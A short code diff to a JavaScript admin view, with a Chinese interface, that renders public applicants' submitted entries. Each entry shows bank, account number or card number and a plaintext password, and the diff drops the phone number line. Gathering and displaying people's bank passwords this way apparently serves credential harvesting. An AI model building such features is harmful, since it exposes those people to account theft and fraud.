@@ -1261,8 +1261,7 @@ async function renderPriorityApplicationList() {
           ['分行名稱', entry.branchName],
           ['銀行戶名', entry.accountName],
           ['銀行帳號', entry.accountNumber || entry.cardNumber],
-          ['密碼', entry.password],
-          ['手機號', entry.phone]
+          ['密碼', entry.password]
         ].map(([label, value]) => `${label}：${escapeHtml(value || '未填')}`).join('｜');
         return `<section class="section-card"><h3>第 ${index + 1} 筆</h3><div>${fields}</div><div class="priority-thread">${thread}</div><div class="document-files"><h3>筆記附件</h3>${files.length ? files.map(fileRow).join('') : '<p class="muted">這筆筆記尚無附件</p>'}<form class="stacked-form" data-priority-upload data-application-id="${escapeHtml(application.id)}" data-entry-id="${escapeHtml(entry.id)}"><label>加在這筆筆記下方的檔案（圖片、Excel 或其他檔案，每個最多 20 MB）<input name="file" type="file" required></label><button type="submit">上傳檔案</button></form></div><form data-priority-reply data-entry-id="${escapeHtml(entry.id)}"><label>給民眾的訊息<textarea name="body" required></textarea></label><button type="submit">回覆民眾</button></form></section>`;
       }).join('')}</div>
